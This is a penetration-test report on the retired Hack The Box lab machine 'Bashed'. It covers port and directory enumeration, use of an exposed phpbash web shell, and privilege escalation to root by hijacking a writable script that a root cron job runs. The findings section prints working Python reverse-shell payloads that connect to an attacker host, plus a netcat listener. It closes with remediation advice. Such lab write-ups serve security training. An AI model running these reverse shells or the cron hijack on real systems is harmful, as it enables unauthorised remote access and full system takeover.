# HTB Bashed - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2025-11-24

**Target:** 10.129.22.73

**Environment:** HTB Bashed (Retired Machine)

---

## 1. Executive Summary

The assessment targeted the "HTB Bashed" host within a controlled lab environment. A full compromise was achieved, including user-level access and privilege escalation to root. The primary weaknesses were:

- Publicly accessible development directory exposing **phpbash**, granting an initial web shell. 
- Misconfigured permissions on `/scripts/` allowing a non-privileged user to modify a Python script executed by **root** via a hidden cron job.

These weaknesses enabled full system takeover.

---

## 2. Scope

- Host: 10.129.22.73
- Allowed: Full exploitation within HTB lab context.
- Goal: Obtain user and root flags, document vulnerabilities, and provide mitigation steps.

---

## 3. Methodology

The assessment followed an OSCP methodology including:

- Enumeration (ports, services, directories)
- Web application assessment
- Shell acquisition
- Privilege escalation
- Evidence collection

---

## 4. Findings

### 4.1 Service Enumeration

A full TCP port scan revealed only **HTTP (80)** open.

```
nmap -p- -sCV 10.129.22.73 -T4 -oA bashed_initial
```

Web server was Apache/2.4.18 on Ubuntu.

### 4.2 Web Application Enumeration

Directory fuzzing discovered a `/dev/` directory:

```
gobuster dir -u http://10.129.22.73 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html
```

Inside `/dev/`, a **phpbash** instance was available:

- `/dev/phpbash.php`

This provided an **interactive web shell** as the `www-data` user.

**Impact:** Direct code execution on the host.

### 4.3 Initial Foothold

Using phpbash, user flag was retrieved:

```
cat /home/arrexel/user.txt
```

A Python reverse shell was used to obtain an interactive TTY:

```
export RHOST="<attacker-ip>"; export RPORT=443;
python -c 'import sys,socket,os,pty; s=socket.socket(); s.connect((os.getenv("RHOST"),int(os.getenv("RPORT")))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn("sh")'
```

PTY was upgraded:

```
python -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo && fg
export TERM=xterm
```

### 4.4 Privilege Escalation

User www-data had sudo access to switch into user scriptmanager:

```
sudo -u scriptmanager bash -i
```

Within `/scripts/`, a file **test.py** was writeable by scriptmanager:

```
-rw-r--r-- 1 scriptmanager scriptmanager ... test.py
```

A root-owned output file `test.txt` was being regenerated periodically:

```
-rw-r--r-- 1 root root ... test.txt
```

**Conclusion:** A root cron job was automatically executing `test.py`.

A backup of `test.py` was made and the file was replaced with a Python reverse shell payload:

```
import socket,subprocess,os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("<attacker-ip>",444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("sh")
```

A listener was opened and root access was obtained once the cron executed:

```
nc -lnvp 444
```

Root flag extracted:

```
cat /root/root.txt
```

---

## 5. Vulnerability Details & Recommendations

### 5.1 Exposed Development Interface (phpbash)

**Risk:** High

**Description:** The `/dev/` directory contained a publicly accessible web shell.

**Recommendation:**

- Remove development tools from production.
- Restrict directory access using ACLs or virtual host rules.

### 5.2 Writeable Script Executed by Root via Cron

**Risk:** Critical

**Description:** User scriptmanager had write permissions to a script executed by root. This allowed arbitrary code execution as root.

**Recommendation:**

- Ensure scripts executed by cron are owned by root and not writeable by other users.
- Limit sudoers privileges.
- Implement logging/monitoring for unexpected file changes.

---

## 6. Conclusion

The "HTB Bashed" host was fully compromised due to a combination of poor development hygiene and dangerous file permission configurations. Remediation of these issues is required to prevent privilege escalation and RCE exposure.

---

## 7. Proofs

**User flag:** *REDACTED*

**Root flag:** *REDACTED*